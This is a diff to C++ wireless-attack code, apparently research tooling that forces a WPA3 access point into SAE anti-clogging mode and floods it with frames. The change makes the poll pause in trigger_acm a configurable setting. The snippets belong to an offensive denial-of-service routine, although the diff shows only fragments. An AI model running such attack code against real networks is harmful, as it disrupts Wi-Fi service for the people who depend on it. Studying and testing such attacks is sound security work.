@@ -63,7 +63,7 @@ void capture_cookies(const string &sniff_iface, const HWAddress<6> &ap_mac, Cook
 }
 
 pair<ACMCookie, int> trigger_acm(const string &iface, const string &att_mac, const HWAddress<6> &ap_mac,
-		const int trigger_count, const sae_helper::SAEPair &sae_params) {
+		const int acm_pause_millisec, const int trigger_count, const sae_helper::SAEPair &sae_params) {
 	PacketSender sender(iface);
 
 	SnifferConfiguration cfg;
@@ -78,7 +78,7 @@ pair<ACMCookie, int> trigger_acm(const string &iface, const string &att_mac, con
 		sender.send(frame);
 
 		auto result = components::poll_sniffer<ACMCookie>(sniffer.get_pcap_handle(),
-				milliseconds(5),
+				milliseconds(acm_pause_millisec),
 				[&](const uint8_t *packet, const uint32_t caplen) -> optional<ACMCookie> {
 					if(auto cookie = parse_acm_response({ packet, packet + caplen })) {
 						if(!cookie->token.empty()) return cookie;
@@ -130,6 +130,7 @@ void run_attack(RunStatus &rs) {
 	const ActorPtr att = rs.get_actor("attacker");
 
 	const auto &att_cfg = rs.config().at("attack_config");
+	const int acm_pause_millisec = att_cfg.at("acm_pause_millisec").get<int>();
 	const int trigger_count = att_cfg.at("acm_trigger_count").get<int>();
 	const int attack_time = att_cfg.at("attack_time_sec").get<int>();
 	const size_t burst_size = att_cfg.at("burst_size").get<size_t>();
@@ -144,7 +145,7 @@ void run_attack(RunStatus &rs) {
 
 	//  force AP into ACM mode
 	rs.process_manager.write_log_all(ATTACK_START_tag);
-	trigger_acm(att.get(SK::iface), att.get(SK::mac), ap.get(SK::mac), trigger_count, sae_params.value());
+	trigger_acm(att.get(SK::iface), att.get(SK::mac), ap.get(SK::mac), acm_pause_millisec, trigger_count, sae_params.value());
 	rs.process_manager.write_log_all("@AKM_trigger");
 
 	rs.start_observers();
